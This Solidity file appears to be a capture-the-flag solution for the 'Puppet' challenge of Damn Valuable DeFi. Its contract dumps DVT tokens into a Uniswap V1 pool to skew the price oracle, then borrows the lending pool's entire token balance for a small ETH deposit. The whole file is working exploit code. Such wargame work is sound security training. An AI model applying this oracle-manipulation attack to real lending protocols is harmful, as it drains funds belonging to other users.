// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {IDamnValuableToken} from "./IDamnValuableToken.sol";
import {IPuppetPool} from "./IPuppetPool.sol";
import {IUniswapExchangeV1} from "./IUniswapExchangeV1.sol";

contract PuppetPoolAttacker {
    error SendEthFailed();

    constructor(address _puppetPool, uint8 _v, bytes32 _r, bytes32 _s) payable {
        // 1. Initialise recurrent interfaces and addresses on memory
        IPuppetPool puppetPool = IPuppetPool(_puppetPool);
        IDamnValuableToken dvt = IDamnValuableToken(puppetPool.token());
        address uniPoolAddr = puppetPool.uniswapPair();
        IUniswapExchangeV1 uniPool = IUniswapExchangeV1(uniPoolAddr);
        // 2. It is required to leverage `EIP-2612` (i.e. `ERC20Permit`) to pass the challenge with a single tx (rather
        // than `ERC20.approve()` + `ERC20.transferFrom()`). Make sure this contract has the DVT allowance set to max.
        dvt.permit(
            msg.sender,
            address(this),
            type(uint256).max,
            type(uint256).max,
            _v,
            _r,
            _s
        );
        uint256 senderDvtBalance = dvt.balanceOf(msg.sender);
        dvt.transferFrom(msg.sender, address(this), senderDvtBalance);
        // 3. Imbalance the liquidity pool by buying all the DVT liquidity
        dvt.approve(uniPoolAddr, senderDvtBalance);
        uniPool.tokenToEthSwapInput(
            senderDvtBalance,
            uniPool.getTokenToEthInputPrice(senderDvtBalance), // NB: min ETH to be bought by the given DVT amount
            block.timestamp + 3600
        );
        // 4. Calculate how much ETH is necessary to borrow all the `PuppetPool` DVT once the pool is imbalanced, and
        // borrow it
        uint256 puppetPoolDvtBalance = dvt.balanceOf(address(puppetPool));
        uint256 depositRequired = puppetPool.calculateDepositRequired(
            puppetPoolDvtBalance
        );
        puppetPool.borrow{value: depositRequired}(
            puppetPoolDvtBalance,
            msg.sender
        );
        (bool success, ) = address(msg.sender).call{
            value: address(this).balance
        }("");
        if (!success) {
            revert SendEthFailed();
        }
    }
}
